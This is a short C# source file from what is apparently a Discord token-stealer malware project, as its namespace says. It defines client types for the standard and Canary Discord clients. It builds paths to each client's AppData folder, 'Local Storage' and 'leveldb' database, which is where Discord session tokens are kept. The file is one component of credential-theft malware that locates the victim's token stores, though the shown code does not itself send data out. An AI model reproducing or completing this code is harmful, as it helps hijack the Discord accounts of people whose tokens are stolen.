namespace DiscordTokenStealer.Discord;
public partial class DiscordClientType : SmartEnum<DiscordClientType>
{
    private readonly string _location;
    public string Location
    {
        get
        {
            if (Directory.Exists(_location))
            {
                return _location;
            }
            throw new DirectoryNotFoundException($"Unable to locate Discord Client {Name} in \"{_location}\"");
        }
    }

    public string LocalStorage => Path.Combine(Location, "Local Storage");

    public string LevelDatabase => Path.Combine(LocalStorage, "leveldb");

    private DiscordClientType(string name) : base(name)
    {
        _location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Name);
    }
}

public partial class DiscordClientType
{
    public static readonly DiscordClientType Default = new("discord");

    public static readonly DiscordClientType Canary = new("discordcanary");
}